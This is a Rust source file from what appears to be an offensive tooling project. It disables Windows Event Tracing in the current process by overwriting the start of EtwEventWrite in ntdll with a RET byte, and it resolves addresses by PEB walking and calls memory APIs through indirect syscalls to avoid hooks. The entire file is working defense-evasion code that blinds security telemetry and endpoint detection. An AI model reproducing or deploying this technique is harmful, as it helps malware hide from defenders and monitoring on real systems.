// Patching EtwEventWrite by writing a ret instruction at the start of the function
//
// https://nyameeeain.medium.com/etw-bypassing-with-custom-binary-together-e2249e2f5b02
// https://www.phrack.me/tools/2023/04/10/Patching-ETW-in-C.html
// https://shellz.club/posts/a-novel-method-for-bypass-ETW/


use std::{mem, process};
use thermite::models::windows::*;
use thermite::models::windows::nt_status::NtStatus;
use thermite::{debug, error, info, syscall_status};
use thermite::peb_walk::{get_function_address, get_module_address};
use thermite::indirect_syscall as syscall;


// Collects the command line arguments, if we dont have a target PID, patch local process
fn main() {
	local_etw_patcher();
}


// Patches ETW by rewiting the first bit of EtwEventWrite with a RET instruction
// Old technique - also i didn't get it to work remotely
fn local_etw_patcher() {
	let mut process_handle: isize = -1;
	let mut old_protec = 0u32;
	let mut new_protec = 0u32;
	let patch = char::from(0xc3);

	let ntdll_handle = unsafe { get_module_address("ntdll.dll") }.unwrap();
	let mut etw_handle = unsafe { get_function_address("EtwEventWrite", ntdll_handle) }.unwrap();

	let mut bytes_written: usize = 1;
	let nt_status = syscall!(
        "NtProtectVirtualMemory",
	        process_handle,          // [in]      HANDLE  ProcessHandle,
	        &mut etw_handle,         // [in, out] PVOID   *BaseAddress,
	        &mut bytes_written,      // [in, out] PULONG  NumberOfBytesToProtect,
	        PAGE_EXECUTE_READWRITE,  // [in]      ULONG   NewAccessProtection,
	        &mut old_protec,         // [out]     PULONG  OldAccessProtection,
    );
	syscall_status!("NtProtectVirtualMemory", nt_status);

	let nt_status = syscall!(
        "NtWriteVirtualMemory",
	        process_handle,      // [in]            HANDLE  ProcessHandle,
	        &etw_handle,         // [in]            PVOID   *BaseAddress,
	        &patch,              // [in]            PVOID   Buffer,
	        1usize,              // [in]            ULONG   NumberOfBytesToWrite,
	        &mut bytes_written,  // [out, optional] PULONG  NumberOfBytesWritten ,
    );
	info!("Written {} bytes in remote memory", bytes_written);
	syscall_status!("NtWriteVirtualMemory", nt_status);

	let nt_status = syscall!(
        "NtProtectVirtualMemory",
	        process_handle,      // [in]      HANDLE  ProcessHandle,
	        &mut etw_handle,     // [in, out] PVOID   *BaseAddress,
	        &mut bytes_written,  // [in, out] PULONG  NumberOfBytesToProtect,
	        old_protec,          // [in]      ULONG   NewAccessProtection,
	        &mut new_protec,     // [out]     PULONG  OldAccessProtection,
    );
	syscall_status!("NtProtectVirtualMemory", nt_status);
}